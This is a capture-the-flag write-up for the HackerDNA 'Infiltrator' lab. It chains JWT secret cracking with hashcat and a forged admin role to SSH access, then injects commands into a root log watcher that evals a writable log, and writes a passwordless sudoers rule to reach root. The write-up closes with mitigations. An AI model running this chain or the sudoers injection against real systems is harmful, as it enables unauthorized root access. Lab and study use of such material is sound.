# Infiltrator — HackerDNA Write-up

> Weak JWT signing secret → administrative access → SSH → unsafe log processing → root.

| Item | Details |
| --- | --- |
| Platform | HackerDNA |
| Lab | [Infiltrator](https://hackerdna.com/labs/infiltrator) |
| Focus | JWT security, Linux privilege escalation |
| Initial shell account | `ctf` |
| Final privilege | `root` |

This write-up reorganizes and explains the [original Infiltrator notes](https://app.notion.com/p/abdullhafeeth/Infiltrator-2614186bce1c80bfa11beda89b61abf3). The commands and results below are based on those notes, not a new execution of the lab. The JWT secret, SSH password, and full root flag were redacted in the source and remain omitted here.

## Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. JWT analysis and secret recovery](#2-jwt-analysis-and-secret-recovery)
- [3. Administrative access and SSH](#3-administrative-access-and-ssh)
- [4. Investigating the log watcher](#4-investigating-the-log-watcher)
- [5. Confirming root command execution](#5-confirming-root-command-execution)
- [6. Obtaining a root shell](#6-obtaining-a-root-shell)
- [7. Key takeaways](#7-key-takeaways)

## 1. Reconnaissance

The first step was a port scan using RustScan:

```bash
export TARGET_IP='<current-lab-ip>'
rustscan -a "$TARGET_IP"
```

The source scan identified two open TCP ports:

| Port | Expected service |
| --- | --- |
| 22 | SSH |
| 80 | HTTP |

The web application provided the starting point, while SSH became useful after obtaining credentials. The source does not include service-version enumeration.

> The notes contain different public and private IP addresses across sessions. Use the address assigned to your current lab instance rather than copying an old address.

## 2. JWT analysis and secret recovery

The notes include a JSON Web Token with the following decoded header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Its payload contains a username, an authorization role, and an expiration time:

```json
{
  "username": "abood0004",
  "role": "user",
  "exp": 1756686793
}
```

JWT payloads are encoded, not encrypted. Decoding the payload reveals its claims, but changing a claim invalidates the signature unless a valid replacement signature is produced.

Here, the token uses **HS256**, an HMAC-based algorithm with a shared secret. A weak secret can be tested offline: each candidate key is used to calculate a signature and compare it with the captured token's signature.

The notes show a dictionary attack with Hashcat mode `16500`:

```bash
# Save the complete JWT from your lab session as one line in jwt.txt.
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# Display the recovered token/secret pair after cracking.
hashcat -m 16500 jwt.txt --show
```

The recorded result was:

```text
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Recovered........: 1/1
```

The signing secret is masked in the original notes. This confirms that the captured token's key was recovered, but the published source does not reveal the key itself.

## 3. Administrative access and SSH

The next recorded step is to change the role from `user` to `admin`.

Conceptually, this requires:

1. Decoding a token from the current lab session.
2. Changing its `role` claim to `admin`.
3. Signing the modified token using HS256 and the recovered secret.
4. Replacing the original token in the same cookie or authorization-header location used by the application.

The historical token is expired; a fresh lab token is needed for reproduction. The source does not document the token storage location, the signing tool, or the administrative page URL.

After the role-change step, the notes list credentials for the `ctf` account and an SSH login:

```bash
ssh "ctf@$TARGET_IP"
```

The SSH password is redacted. The notes place these credentials after the administrative-access step, but do not show exactly where they were obtained.

## 4. Investigating the log watcher

After obtaining a shell, the notes show inspection of a script in `/usr/local/bin`:

```bash
cat /usr/local/bin/log_watcher.sh
```

The script below preserves the source logic with formatting normalized:

```bash
#!/bin/bash

LOG_FILE="/var/log/custom.log"

# Create the log file if it doesn't exist.
[ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"

while true; do
    while read -r line; do
        [ -n "$line" ] && eval "$line"
    done < "$LOG_FILE"

    sleep 30
done
```

The vulnerable operation is:

```bash
eval "$line"
```

Instead of treating log entries as data, the script interprets each non-empty line as shell code. If a lower-privileged user can append to this file, that user controls commands executed by the watcher.

The exploit depends on two conditions demonstrated by the subsequent commands:

- The `ctf` account can append to `/var/log/custom.log`.
- The watcher executes the appended command with root privileges.

The notes do not include the file permissions or the service configuration that starts the watcher. Its execution privilege is established by the proof of execution below.

## 5. Confirming root command execution

A small proof of execution appends a command that writes the watcher's identity to a temporary file:

```bash
echo 'id > /tmp/whoami.txt' >> /var/log/custom.log
sleep 35
cat /tmp/whoami.txt
```

The recorded output begins:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

This confirms that the injected command runs as root. The wait allows the watcher to reach its next processing cycle; its loop sleeps for 30 seconds between reads.

Because the script rereads the whole log on each iteration, existing entries can execute repeatedly.

## 6. Obtaining a root shell

The source then uses root command execution to create a sudoers rule for `ctf`. The following is a normalized, single-line version of the recorded payload:

```bash
echo '/usr/bin/printf "ctf ALL=(ALL:ALL) NOPASSWD:ALL\n" | /usr/bin/tee /etc/sudoers.d/ctf >/dev/null; /bin/chmod 440 /etc/sudoers.d/ctf; : > /var/log/custom.log' >> /var/log/custom.log
sleep 35
sudo -l
```

When the watcher evaluates the line, it:

1. Writes a rule permitting `ctf` to run any command through sudo without a password.
2. Sets the sudoers file permissions to `0440`.
3. Truncates the custom log so the injected entry is not replayed on later cycles.

The recorded `sudo -l` output confirms the new rule:

```text
User ctf may run the following commands:
    (ALL : ALL) NOPASSWD: ALL
```

The current shell remains owned by `ctf` until sudo is invoked. The notes then show:

```bash
sudo su
cd /root
ls
cat flag-root.txt
```

The root directory contains `flag-root.txt`, and its contents are shown partially redacted in the source. The full flag is intentionally not reproduced here.

## 7. Key takeaways

| Weakness | Impact | Mitigation |
| --- | --- | --- |
| Guessable HS256 secret | Offline recovery of the JWT signing key | Generate a high-entropy secret and protect it appropriately; rotate compromised keys |
| Authorization based on a token signed with a compromised key | Forged administrative role | Validate signatures and claims, and enforce server-side authorization with protected signing keys |
| `eval` applied to writable log content | Arbitrary shell command execution | Parse log entries as data; remove `eval` |
| Root process consuming lower-trust input | Full system compromise | Apply least privilege and restrict write access to privileged inputs |

The chain connects a web authentication weakness to a local trust-boundary failure. Recovering the JWT secret enables valid signatures for modified claims. On the host, interpreting writable log entries as commands turns an ordinary user shell into root access.

## References and attribution

- [HackerDNA — Infiltrator lab](https://hackerdna.com/labs/infiltrator)
- [Original Infiltrator notes — abdullhafeeth on Notion](https://app.notion.com/p/abdullhafeeth/Infiltrator-2614186bce1c80bfa11beda89b61abf3)

This document is an explanatory adaptation of the linked notes. Missing screenshots, hidden values, and undocumented intermediate steps have not been presented as independently verified findings.
